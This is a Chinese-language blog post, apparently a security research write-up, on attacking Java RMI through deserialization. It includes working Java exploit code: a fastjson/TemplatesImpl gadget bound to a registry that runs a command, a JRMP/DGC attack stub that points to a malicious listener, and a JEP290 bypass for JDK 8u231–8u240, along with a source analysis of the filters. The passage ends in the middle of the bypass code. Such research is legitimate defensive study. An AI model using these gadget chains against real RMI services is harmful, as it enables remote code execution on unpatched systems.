+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> remoteObj.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> tools.ClassByteGen;</span><br><span class="line"><span class="keyword">import</span> tools.InvocationHandlerImpl;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"><span class="keyword">import</span> tools.TemplatesGen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">HelloImpl</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getPayload();</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, (Remote) payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fastjson原生反序列化触发getter</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        Runtime.getRuntime().exec(\&quot;calc\&quot;);\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassByteGen.getBytes(code, <span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesGen.getTemplates(bytes, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        ReflectTools.setFieldValue(bad, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">InvocationHandlerImpl</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandlerImpl</span>(bad);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(invocationHandler.getClass().getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ClassByteGen：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassByteGen</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String code, String className) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        String Abstract = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        pool.importPackage(Abstract);</span></span><br><span class="line">        pool.importPackage(<span class="string">&quot;java.io&quot;</span>);</span><br><span class="line">        pool.importPackage(<span class="string">&quot;java.nio.file&quot;</span>);</span><br><span class="line">        pool.importPackage(<span class="string">&quot;java.lang.reflect&quot;</span>);</span><br><span class="line">        pool.importPackage(<span class="string">&quot;java.nio.charset&quot;</span>);</span><br><span class="line">        pool.importPackage(<span class="string">&quot;java.util&quot;</span>);</span><br><span class="line"><span class="comment">//        pool.insertClassPath(Abstract);</span></span><br><span class="line"><span class="comment">//        pool.insertClassPath(&quot;java.nio&quot;);</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(className);</span><br><span class="line"><span class="comment">//        ctClass.setSuperclass(pool.get(Abstract));</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> ctClass.makeClassInitializer();</span><br><span class="line">        ctConstructor.setBody(code);</span><br><span class="line"><span class="comment">//        CtConstructor ctConstructor1 = new CtConstructor(new CtClass[]&#123;&#125;, ctClass);</span></span><br><span class="line"><span class="comment">//        ctConstructor1.setBody(code);</span></span><br><span class="line"><span class="comment">//        ctClass.addConstructor(ctConstructor1);</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;ClassByteGen&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>InvocationHandlerImpl:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态代理，实现对象接口转化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvocationHandlerImpl</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvocationHandlerImpl</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.object = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先启动registry，在运行server，成功利用。</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762680672203-d2af663d-c2e0-4fb4-8a86-c799b02c38ac.png"  alt="img"></p>
+<p>主要看bind。server端动态获得一个registry stub。38行与registry建立连接，传opnum和hash。</p>
+<p>41、42、43建立对象输出流，把远程对象的名称和对应的stub序列化。</p>
+<p>然后看registry端的，我们直接把断点打在readObject，因为肯定要反序列化，然后再看前面的调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762680913703-c897e4ae-00ce-452c-802f-cfa09ff49543.png"  alt="img"></p>
+<p>主要看skel#dispatch。之前的opnum和hash，分别对应这里的var3，var4 。所以这里进入case0</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762681006829-312e24f2-47ae-4d86-9c93-fb96f9e9ad24.png"  alt="img"></p>
+<p>case0就是把server传输过来的远程对象名称和stub都反序列化，然后绑定到本地。而这里的反序列化没做任何过滤。</p>
+<p>同样，可以看到其他case里的rebind，lookup等方法也有直接readObject：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762681122257-1d08e82d-eb2b-4766-9f98-39210b2f0667.png"  alt="img"></p>
+<p>所以理论上都存在反序列化漏洞。</p>
+<p>还有一个比较重要的地方，就是在bind前要套一层动态代理，转化成Remote接口实现。因为bind方法的第二个参数要求实现Remote接口：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762681399001-81fff557-99e9-4467-a6b8-ea8e32679682.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762681411827-98535010-12bd-45c9-ba6a-97148269af47.png"  alt="img"></p>
+<h2 id="DGC传输恶意对象（JRMP攻击）"><a href="#DGC传输恶意对象（JRMP攻击）" class="headerlink" title="DGC传输恶意对象（JRMP攻击）"></a>DGC传输恶意对象（JRMP攻击）</h2><p>根据上面的分析我们知道，registry获取到stub后，会向server skel发起dgc dirty请求，而server会返回lease对象。所以我们可以建一个符合JRMP协议的DGC server（DGC只要符合JRMP即可），当registry发起dirty请求时，返回恶意对象，从而实现server打registry。这其实就是JRMP攻击的一种。JRMP常常会与DGC机制联系。</p>
+<p>首先在server端构造一个恶意stub，里面的skel地址指向恶意JRMP Server：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> remoteObj.HelloImpl;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> tools.ClassByteGen;</span><br><span class="line"><span class="keyword">import</span> tools.InvocationHandlerImpl;</span><br><span class="line"><span class="keyword">import</span> tools.ReflectTools;</span><br><span class="line"><span class="keyword">import</span> tools.TemplatesGen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">HelloImpl</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> makeJRMPAttack(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">13999</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, (Remote) o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeJRMPAttack</span><span class="params">(String host, <span class="type">int</span> port)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(Server.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用java-chain起一个恶意JRMP服务：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762687292673-6da89cce-e29d-49f0-a739-22752fbd367f.png"  alt="img"></p>
+<p>接着依次启动Registry，Server即可攻击成功。会弹好几次计算器，因为DGC请求是持续发送的。</p>
+<p>如果要自己写恶意JRMP服务的话，可以参考ysoserial源码中的ysoserial.exploit.JRMPListener</p>
+<p>同样，也可以registry打server。还是用java-chains创建恶意JRMP服务。然后server端填13999端口就行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">13999</span>);</span><br><span class="line">        <span class="type">HelloImpl</span> <span class="variable">hello</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HelloImpl</span>();</span><br><span class="line"><span class="comment">//        Object o = makeJRMPAttack(&quot;127.0.0.1&quot;, 13999);</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getPayload();</span><br><span class="line">        registry.bind(<span class="string">&quot;evil&quot;</span>, hello);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而且server执行bind，list，lookup，rebind，unbind都会触发。因为registry skel里都有releaseInputStream，即都会发送DGC请求给server：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762689091182-9732020c-85b8-4b2c-a78f-a55e27f5ace7.png"  alt="img"></p>
+<p>不管是registry还是server，都会收到DGC相关的序列化数据，所以都有反序列化的过程。因此JRMP都可以打。</p>
+<p>server打client也是一样，java-chains起JRMP服务。client访问13999端口即可。client随便lookup一个对象即可，因为重要的是返回的stub里的skel的地址，这个地址跟lookup的对象无关，是恶意JRMP服务固定返回的。</p>
+<p>server打registry流程图：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762761942478-9724c81a-7026-4e38-87c4-9ef30f73f579.png"  alt="img"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>上面讲了如何通过bind实现server打registry；如何通过DGC实现registry打server，server打registry，server打client。其他还有在远程方法调用过程中，通过传参实现client打server，通过返回值实现server打client。不过都不太实用，就不细讲了，了解即可。</p>
+<h1 id="jdk高版本修复-绕过"><a href="#jdk高版本修复-绕过" class="headerlink" title="jdk高版本修复&amp;绕过"></a>jdk高版本修复&amp;绕过</h1><h2 id="打不了registry"><a href="#打不了registry" class="headerlink" title="打不了registry"></a>打不了registry</h2><p>在大于jdk8u121时，无法通过bind实现server打registry。因为此时registry反序列化是白名单机制。也无法通过DGC去打registry，因为也有白名单。</p>
+<p>下面是过滤后的结果：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762740002889-8968986a-2eeb-41aa-ba9c-e583807088f4.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762740049301-1ffed518-a726-45c8-ace8-964ef19551f3.png"  alt="img"></p>
+<p>看一下registry的调用栈：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762740732916-4b258e41-86bf-415f-8fa8-fd22b327b0d4.png"  alt="img"></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762740822296-12d9513d-2d8e-44a8-b05d-ce171188fe04.png"  alt="img"></p>
+<p>最后的registryFilter，只允许String\Number\Remote\Proxy\UnicaseRef\RMIClientSocketFactory\RMIServerSocketFactory\Actibation\UID的类通过反序列化，这样一来，我们的gadget肯定用不了。</p>
+<p>这里的filter是在sun.rmi.server.UnicastServerRef#unmarshalCustomCallData设置的：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762759561081-545a74ab-06e9-4fbf-a5b7-c848e89922da.png"  alt="img"></p>
+<p>这种通过黑白名单对bind的反序列化防护，其实就是JEP290.</p>
+<h2 id="绕过JEP290（8u121-8u230）"><a href="#绕过JEP290（8u121-8u230）" class="headerlink" title="绕过JEP290（8u121~8u230）"></a>绕过JEP290（8u121~8u230）</h2><p>先简单讲一下JEP290是什么。</p>
+<p>JEP290 是 Java 底层为了解决反序列化攻击所提出的一种方案，主要有以下机制：</p>
+<p>提供一个限制反序列化类的机制，白名单或者黑名单</p>
+<p>限制反序列化的深度和复杂度</p>
+<p>为 RMI 远程调用对象提供了一个验证类的机制</p>
+<p>定义一个可配置的过滤机制，比如可以通过配置 properties 文件的形式来定义过滤器</p>
+<p>设置JEP290有两种方法：</p>
+<p>1、通过setObjectInputFilter来设置filter</p>
+<p>2、直接通过conf&#x2F;security&#x2F;java.properties文件进行配置</p>
+<p>上面在bind时，进行了反序列化防护，但是在DGC通信中，没设置filter，而且DGC通信是有反序列化点的。所以可以通过发送恶意DGC数据的形式，进行攻击。这也就是JRMP打法，因为DGC通信满足JRMP协议。</p>
+<p>这个其实在RMI攻击演示&amp;源码分析那边讲过了，就是DGC传输恶意对象（JRMP攻击）。</p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>但是这种DGC传输恶意对象的方式，在8u231被修复过。</p>
+<p>看一下registry对server返回的恶意lease对象做了什么过滤，也就是普通DGC在8u230以后不能打的原因，这里是jdk8u341.</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762744365950-113c5bdf-33d5-4578-9dc5-a67d9a4dbf24.png"  alt="img"></p>
+<p>这里也引入了白名单机制。所以打registry的方法应该都失效了。</p>
+<p>不过还是可以通过DGC打server和client，这两者在反序列化DGC请求时没有serialFilter。</p>
+<p>这个补丁就是常说的JEP290 。在 RMI 中 JEP290 主要是在远程引用层 之上进行过滤的，所以其过滤作用对 Server 和 Client 的互相攻击无效。</p>
+<p>但是DGC打法在8u121~8u230之间的部分版本是可以打的，主要看DGCImpl_Stub里有没有这行代码：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762758572661-b9c164fb-f603-45b4-94fa-bdc21758fe0a.png"  alt="img"></p>
+<p>不过&gt;8u230还是有方法绕过</p>
+<h2 id="绕过JEP290（8u231-8u240）"><a href="#绕过JEP290（8u231-8u240）" class="headerlink" title="绕过JEP290（8u231~8u240）"></a>绕过JEP290（8u231~8u240）</h2><p>文章末尾提到了如何绕过：<a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/news/8299" >https://xz.aliyun.com/news/8299<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1762758867338-313eb904-e175-42d5-a45d-1ee7da36ac0c.png"  alt="img"></p>
+<p>这里针对的绕过是8u231~8u240</p>
+<p>不过链接里的文章失效了，可以看这篇：<a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259059#h3-11" >https://www.anquanke.com/post/id/259059#h3-11<i class="fas fa-external-link-alt"></i></a></p>
+<p>原理和修复文章都讲了，这里不赘述。</p>
+<p>最终的Server：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.registry.RegistryImpl_Stub;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绕过JEP290(8u231~8u240)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServerBypassJEP290</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnicastRemoteObject</span> <span class="variable">payload</span> <span class="operator">=</span> getPayload();</span><br><span class="line">        java.rmi.registry.<span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="number">1099</span>);</span><br><span class="line">        bindReflection(<span class="string">&quot;pwn&quot;</span>, payload, registry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> UnicastRemoteObject <span class="title function_">getPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;localhost&quot;</span>, <span class="number">13999</span>);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">RMIServerSocketFactory</span> <span class="variable">factory</span> <span 